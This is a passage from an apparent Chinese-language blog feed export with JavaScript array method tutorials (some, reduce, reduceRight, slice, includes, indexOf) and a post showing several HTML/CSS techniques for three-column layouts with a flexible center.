class="number">21</span>].<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">item, index, ary</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(item) <span class="comment">// 1 只执行了一次</span></span><br><span class="line"> <span class="keyword">return</span> item &lt; <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">21</span>].<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">item, index, ary</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(item) <span class="comment">// 1 2 3 10 21 遍历了全部</span></span><br><span class="line"> <span class="keyword">return</span> item &gt; <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h4 id="reduce-reduceRight"><a href="#reduce-reduceRight" class="headerlink" title="reduce, reduceRight"></a>reduce, reduceRight</h4><p><a href="https://www.jianshu.com/p/5e962d1b9844">具体用法详见：JS Array.reduce 理解与使用 - 简书</a></p><p>函数：array.reduce(function(total, currentValue, currentIndex, arr), initialValue)</p><p>功能：聚合数组项，根据聚合函数生成最后结果。当没有指定initialValue时，reduce从第一个元素开始，从左向右聚合，reduceRight相反。【total为上次循环的 结果集，currentValue为array遍历的当前项】</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res) <span class="comment">// 1 + 2 + 3 + 4 + 5 = 15</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b</span><br><span class="line">&#125;, <span class="number">10</span>) <span class="comment">// 初始值console.log(res) // 10 + 1 + 2 + 3 + 4 + 5 = 25</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res) <span class="comment">// 1 - 2 - 3 - 4 - 5 = -13</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].<span class="title function_">reduceRight</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res) <span class="comment">// 5 - 4 - 3 - 2 - 1 = -5</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].<span class="title function_">reduceRight</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b</span><br><span class="line">&#125;, <span class="number">1</span>) <span class="comment">// 初始值console.log(res) // 1 - 5 - 4 - 3 - 2 - 1 = -14</span></span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><h4 id="会改变-原数组的操作：reverse-sort-splice-push-pop-shift-unshift"><a href="#会改变-原数组的操作：reverse-sort-splice-push-pop-shift-unshift" class="headerlink" title="会改变 原数组的操作：reverse, sort, splice, push, pop, shift, unshift"></a>会改变 原数组的操作：reverse, sort, splice, push, pop, shift, unshift</h4><h2 id="三、字符串-与-数组-的一些同名操作"><a href="#三、字符串-与-数组-的一些同名操作" class="headerlink" title="三、字符串 与 数组 的一些同名操作"></a>三、字符串 与 数组 的一些同名操作</h2><h3 id="slice-1"><a href="#slice-1" class="headerlink" title="slice"></a>slice</h3><p>const str &#x3D; ‘012345’.slice(1,3) &#x2F;&#x2F; ‘12’<br>const ary &#x3D; [0,1,2,3,4,5].slice(1,3) &#x2F;&#x2F; [1,2]</p><h3 id="concat-2"><a href="#concat-2" class="headerlink" title="concat"></a>concat</h3><p>const str &#x3D; ‘start’.concat(‘, ‘, ‘hello’, ‘ world’) &#x2F;&#x2F; start, hello world<br>const ary &#x3D; [‘start’].concat([‘,’, ‘ hello’], [‘world’]) &#x2F;&#x2F; [‘start’, ‘,’, ‘ hello’, ‘world’]</p><h3 id="includes-1"><a href="#includes-1" class="headerlink" title="includes"></a>includes</h3><p>用处：判断 数组 是否包含 指定的元素。或者 字符串 是否包含指定的 子字符串。返回boolean值</p><p>arr &#x3D; [1, 2, 3, 4];<br>str &#x3D; ‘sdfga’;<br>console.log(arr.includes(2));&#x2F;&#x2F;true<br>console.log(arr.includes(6));&#x2F;&#x2F;false<br>console.log(str.includes(‘df’));&#x2F;&#x2F;true<br>console.log(str.includes(‘h’));&#x2F;&#x2F;false</p><h3 id="indexOf-lastIndexOf-1"><a href="#indexOf-lastIndexOf-1" class="headerlink" title="indexOf, lastIndexOf"></a>indexOf, lastIndexOf</h3><p>const index1 &#x3D; ‘hello world’.indexOf(‘o’) &#x2F;&#x2F; 4<br>const index2 &#x3D; [‘hello’，’world’].indexOf(‘world’) &#x2F;&#x2F; 1<br>const index3 &#x3D; ‘hello world’.lastIndexOf(‘o’) &#x2F;&#x2F; 7<br>const index4 &#x3D; [‘hello’，’world’].lastIndexOf(‘world’) &#x2F;&#x2F; 1</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>左中右三栏式布局</title>
      <link href="/posts/zuo-zhong-you-san-lan-shi-bu-ju/"/>
      <url>/posts/zuo-zhong-you-san-lan-shi-bu-ju/</url>
      
        <content type="html"><![CDATA[<p>一、中间 自适应，左右两边 宽度固定</p><h3 id="方法1：box容器-Flex布局，center设置为-flex-1"><a href="#方法1：box容器-Flex布局，center设置为-flex-1" class="headerlink" title="方法1：box容器 Flex布局，center设置为 flex:1"></a>方法1：box容器 Flex布局，center设置为 flex:1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#box</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#left</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#999</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#center</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">flex</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*左右margin不会叠加*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f00</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;center&quot;</span>&gt;</span>center<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法2：左、右两栏-分别-float-left、float-right。center左右margin，或者激活center的BFC"><a href="#方法2：左、右两栏-分别-float-left、float-right。center左右margin，或者激活center的BFC" class="headerlink" title="方法2：左、右两栏 分别 float:left、float:right。center左右margin，或者激活center的BFC"></a>方法2：左、右两栏 分别 float:left、float:right。center左右margin，或者激活center的BFC</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.left</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#999</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.center</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 方式二、 */</span></span></span><br><span class="line"><span class="language-css">            <span class="comment">/* margin: 0 200px; */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 方式一、激活center的BFC，使之无法被 两边的浮动元素 覆盖*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f00</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--该布局法的好处是受外界影响小，但是不足是 三个元素的顺序，center一定要放在最后，这是            </span></span><br><span class="line"><span class="comment">        和绝对定位不一样的地方，center占据文档流位置，所以一定要放在最后，左右两个元素位置没有关系。</span></span><br><span class="line"><span class="comment">        当浏览器窗口很小的时候，右边元素会被挤到下一行。--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span>center<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法3：左、右两栏-分别-绝对定位，center左右margin"><a href="#方法3：左、右两栏-分别-绝对定位，center左右margin" class="headerlink" title="方法3：左、右两栏 分别 绝对定位，center左右margin"></a>方法3：左、右两栏 分别 绝对定位，center左右margin</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/*左右固定，中间自适应  利用绝对定位*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: black;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.center</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: yellow;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">right</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span>center<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法4：三栏都-float-left；对center的宽度-进行-calc-计算"><a href="#方法4：三栏都-float-left；对center的宽度-进行-calc-计算" class="headerlink" title="方法4：三栏都 float: left；对center的宽度 进行 calc()计算"></a>方法4：三栏都 float: left；对center的宽度 进行 calc()计算</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.left</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.center</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">200px</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: yellow;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span>center<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法5：双飞翼布局（重点）优先显示-main主要部分"><a href="#方法5：双飞翼布局（重点）优先显示-main主要部分" class="headerlink" title="方法5：双飞翼布局（重点）优先显示 main主要部分 !"></a>方法5：双飞翼布局（重点）优先显示 main主要部分 !</h3><div class="tip 